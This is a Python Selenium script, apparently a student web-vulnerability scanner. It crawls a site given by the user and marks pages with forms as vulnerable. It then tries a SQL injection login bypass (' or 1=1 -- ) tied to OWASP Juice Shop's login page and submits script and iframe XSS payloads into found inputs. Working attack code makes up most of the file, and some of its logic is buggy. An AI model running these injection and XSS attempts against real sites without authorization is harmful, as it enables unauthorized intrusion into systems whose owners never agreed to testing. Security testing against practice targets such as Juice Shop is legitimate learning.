from time import sleep
from random import uniform
from soup_methods import find_links, find_buttons, find_inputs
from bs4 import BeautifulSoup
from init import initialize
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

#Find available links 
def available_links(driver,site):
    #Get domain
    domain = site.split('.')[0]
    #Visit home
    driver.get(site)
    #While there are available links
    while len(queue) != 0 : 
        #Get first link
        link = queue[0] 
        #Visit first link
        driver.get(f'{site}{link}')
        sleep(uniform(1.3,1.7))
        #Get html
        page = driver.page_source
        if '404' not in page :
            #Parse html
            soup = BeautifulSoup(page,'html.parser')
            #Loop through buttons
            for ref in find_buttons(soup,queue,available):
                if ref not in queue:
                    queue.append(ref)
            #Loop through links
            for ref in find_links(soup,domain,queue,available):
                if ref not in queue:
                    queue.append(ref)
            #Add to available links and remove from queue
            available.add(queue.pop(0))
        else:
            queue.pop(0)
#Check if the link has an input form
def check_form_val(driver,site):
    vulnerable_links=[]
    #Loop through available links
    for link in available:
        driver.get(f'{site}{link}')
        sleep(uniform(1.5,1.8))
        #Get html
        page = driver.page_source
        #Parse html
        soup = BeautifulSoup(page,'html.parser')
        #Find all inputs
        if find_inputs(soup):
            vulnerable_links.append(link)
    return vulnerable_links


def loginsqlinjection(site,link,driver): #check for sql injection
    driver.get(f'{site}{link}')
    sleep(2)
   # driver.find_element_by_xpath('/html/body/div[3]/div[2]/div/mat-dialog-container/app-welcome-banner/div/button[2]/span/span').click() #find login button
    driver.find_element_by_xpath('//*[@id="email"]').send_keys(" ' or 1=1 -- ")
    password=driver.find_element_by_xpath('//*[@id="password"]') 
    text='sqlinjection'
    for characters in text:
        password.send_keys(characters)
        sleep(0.3) #set username and password 
    driver.find_element_by_xpath('//*[@id="loginButton"]').click() 
    sleep(5)
    if driver.current_url=='https://juice-shop.herokuapp.com/#/search': #check if login failed 
          print("your page is vulnerable to sql injection")
    else:
        print("login failed")

def xssattack(driver,links):
    #Checking for 
    attacks = ['<script>alert("1")</script>','<iframe src="javascript:alert(`1`)">']
    print('\nChecking for successful XSS attacks')
    flag = False
    #Loop through links
    for link in links:
        driver.get(f'{site}{link}')
        #Parse html
        soup = BeautifulSoup(driver.page_source,'html.parser')
        #Find input/inputs
        inp = soup.find('input')
        input_found = False
        try:
            #If many inputs
            if isinstance(inp,list):
                #Find the class of the first 
                attribute = inp['class'][0]
            else:
                attribute = inp['class']
            #Find element
            input_form = driver.find_element_by_class_name(attribute)
            #Click it
            input_form.click()
            input_found = True
        except:
            pass
        
        try:
            #Check if its a list
            if isinstance(inp,list):
                #Get first input
                attribute = inp['id'][0]
            else:
                attribute = inp['id']
            #FInd element
            input_form = driver.find_element_by_id(attribute)
            input_form.click()
            input_found = True
        except:
            pass
        
        try:
            #Find an element containing search.Probably search input
            input_form = driver.find_elements_by_xpath("//*[contains(text(), 'search')]")
            #If its a list of inputs
            if isinstance(input_form,list):
                #Loop though inputs
                for i in input_form:
                    try:
                        #Try clicking it
                        i.click()
                        input_found = True
                        #Find id of input
                        input_id = soup.find('input')['id']
                        #Get element from id now that it is revealed
                        input_form = driver.find_element_by_id(input_id)
                        break
                    except:
                        pass
            else:
                #Click element
                input_form.click()
                input_found = True
        except:
            pass
        #If input is found
        if input_found == True:
            #Loop through attacks
            for attack in attacks:
                #If we got many inputs
                if isinstance(input_form,list):
                    #Loop through inputs
                    for i in input_form:
                        try:
                            #Send attack
                            input_form.send_keys(attack)
                            input_form.send_keys(Keys.RETURN)
                            break
                        except:
                            pass
                else:
                    #Send attack
                    input_form.send_keys(attack)
                    input_form.send_keys(Keys.RETURN)
                try:
                    #Check alert box we opened
                    alert = WebDriverWait(driver,2).until(EC.alert_is_present())
                    alert.accept()
                    #We found an xss
                    flag = True
                except:
                    pass
                #If an attack was successful, return to main
                if flag == True:
                    return True
        else:
            #If no input was discovered, go to next available link
            continue 
    #Return None if nothing was found
    return None

if __name__ == '__main__':
    #Basic queue for crawling
    queue = list()
    #Set of available links
    available = set()
    #Init webdriver
    driver = initialize()
    #Init list an set
    queue.append('/')
    available.add('/')
    #Get website
    site = input('Give site full url: ')
    print('\nFinding available urls of the given site')
    #Find available links
    available_links(driver,site)
    #Print available links
    print('Available Urls:')
    for link in available:
        print(f'---{link}')
    print('\n')
    #Check for inputs
    vulnerable_links = check_form_val(driver,site)
    #Print threat level of links
    for vul_link in vulnerable_links:
        if 'login' in vul_link or 'signup' in vul_link:
            print(f'{vul_link} is probably vulnerable to Sql Injection')
        else:
            print(f'{vul_link} is probably vurnerable to XSS attack')

   # if '/login/' in  vulnerable_links: #check if link has login 
   #     loginsqlinjection(site,'/login/',driver)

    #Get results of xss
    response = xssattack(driver,available)
    #Print results of xss
    if response is None:
       print('\nXss attacks failed')
    else:
       print('\nThere are available xss attacks')